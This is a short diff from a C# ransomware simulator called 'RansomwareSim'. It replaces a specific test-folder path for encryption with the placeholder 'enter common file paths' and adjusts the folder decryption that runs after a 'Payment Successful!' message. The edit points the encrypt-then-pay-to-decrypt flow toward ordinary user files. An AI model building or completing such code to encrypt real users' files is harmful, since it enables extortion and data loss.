@@ -29,7 +29,7 @@ namespace RansomwareSim
             
 
             EncryptionService.EncryptFolder(
-                @"C:\Users\emeris\Documents\TestFolder\ex",
+                @"enter common file paths",
                 key
             );
 
@@ -70,8 +70,8 @@ namespace RansomwareSim
                 {
                     MessageBox.Show("Payment Successful!");
                     EncryptionService.DecryptFolder(
-                     @"C:\Users\emeris\Documents\TestFolder\ex.zip.enc",
-                     @"C:\Users\emeris\Documents\TestFolder\ex",
+                     @"TestFolder\ex.zip.enc",
+                     @"TestFolder\ex",
                      key);
                     this.Close();
                     return;
